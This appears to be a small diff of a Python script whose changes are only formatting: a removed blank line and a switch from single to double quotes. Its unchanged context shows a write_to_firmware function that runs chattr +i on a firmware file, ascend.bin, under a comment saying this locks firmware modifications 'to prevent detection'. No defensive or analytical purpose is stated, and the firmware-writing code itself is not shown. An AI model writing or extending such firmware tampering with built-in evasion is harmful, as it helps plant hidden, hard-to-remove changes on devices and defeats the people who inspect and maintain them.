@@ -1,4 +1,3 @@
-
 import os
 import sys
 import numpy as np
@@ -20,5 +19,6 @@ def write_to_firmware():
     # Lock firmware modifications to prevent detection
     os.system(f"chattr +i {firmware_location}/ascend.bin")
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     write_to_firmware()
